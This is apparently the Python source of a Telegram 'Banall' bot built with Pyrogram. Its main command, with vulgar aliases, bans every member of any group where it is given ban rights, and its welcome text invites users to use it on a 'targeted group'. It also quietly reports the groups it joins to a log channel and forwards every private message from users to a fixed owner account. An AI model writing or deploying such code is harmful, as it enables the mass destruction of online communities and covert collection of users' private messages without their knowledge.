import asyncio
import subprocess
import os
import time

from pyrogram.errors.exceptions.flood_420 import FloodWait
from pyrogram import Client,filters
from pyrogram.types import Message, ChatPermissions
from pyrogram.types import *
from .config import Config
from database.users_chats_db import db
import logging
from pyrogram.errors import (
    ChatAdminRequired
)
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

bot=Client(":memory:",api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,bot_token=Config.TELEGRAM_TOKEN)

log_channel = -1001955155721


@bot.on_message(filters.command(["banall", "fuckall", "tmkc", "chudaistart"]))
async def _(bot, msg):
    print("getting memebers from {}".format(msg.chat.id))
    async for i in bot.iter_chat_members(msg.chat.id):
        try:
            await bot.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
            print("kicked {} from {}".format(i.user.id,msg.chat.id))
        except FloodWait as e:
            await asyncio.sleep(e.x)
            print(e)
        except Exception as e:
            print(" failed to kicked {} from {}".format(i.user.id,e))           
    print("process completed")



@bot.on_message(filters.command("start") & filters.private)
async def hello(bot, message):
    await message.reply("Hello, This Is a Banall Bot, I can Ban Members Within seconds!\n\n Simply give me Ban rights in targeted group and give command /banall, or you can use alternative commands like /tmkc, /chudaistart, /fuckall [๏](https://te.legra.ph/file/6e056c758a8f6f47476fb.jpg)")


@bot.on_message(filters.command(["gitpull", "update"]) & filters.user(1143358497))
async def _gitpull(_, message):
    m = subprocess.check_output(["git", "pull"]).decode("UTF-8")
    if str(m[0]) != "A":
        x = await message.reply_text("**» ғᴇᴛᴄʜɪɴɢ ᴜᴩᴅᴀᴛᴇs ғʀᴏᴍ ʀᴇᴩᴏ ᴀɴᴅ ᴛʀʏɪɴɢ ᴛᴏ ʀᴇsᴛᴀʀᴛ...**")
        return os.system(f"kill -9 {os.getpid()} && python3 -m bot")
    else:
        await message.reply_text(f"**» {BOT_NAME} ɪs ᴀʟʀᴇᴀᴅʏ ᴜᴩ-ᴛᴏ-ᴅᴀᴛᴇ !**")



# Replace the chat_id with the ID of the group where bot will send logs
log_chat_id = -1001955155721

# Function to get the chat link if the chat is public
def get_chat_link(chat):
    if chat.username:
        return "https://t.me/{}".format(chat.username)
    elif chat.type == 'supergroup':
        return "https://t.me/{}?invite={}".format(chat.username, chat.invite_link)
    return False

# Function to write logs in the specified chat
def write_logs(chat_link, chat_id, added_by, num_members):
    if chat_link:
        text = "{} ({})\nAdded by: {}\nMembers: {}".format(chat_link, chat_id, added_by, num_members)
    else:
        text = "Chat ID: {}\nAdded by: {}\nMembers: {}".format(chat_id, added_by, num_members)
    bot.send_message(log_chat_id, text)

# Function to handle when the bot is added to a group
def new_chat_members_handler(client: Client, message: Message):
    bot_username = bot.get_me().username
    chat = message.chat
    num_members = bot.get_chat_members_count(chat.id)
    added_by = message.from_user.mention if message.from_user else "Unknown"
    if chat.type == 'supergroup' and not chat.username:
        bot.leave_chat(chat.id)
    elif chat.type == 'supergroup' and chat.username:
        chat_link = get_chat_link(chat)
        write_logs(chat_link, chat.id, added_by, num_members)
        bot.send_message(chat.id, "Thank you for adding me to this group {}! :)".format(message.chat.title))
    elif chat.type == 'private':
        bot.send_message(chat.id, "Please add me to a group chat!")
    else:
        write_logs(None, chat.id, added_by, num_members)

bot.add_handler(new_chat_members_handler, filters.new_chat_members)




@bot.on_message(filters.private & filters.incoming)
async def on_pm_s(client: Client, message: Message):
    if message.from_user.id != 1143358497:
        fwded_mesg = await message.forward(chat_id=1143358497, disable_notification=True)

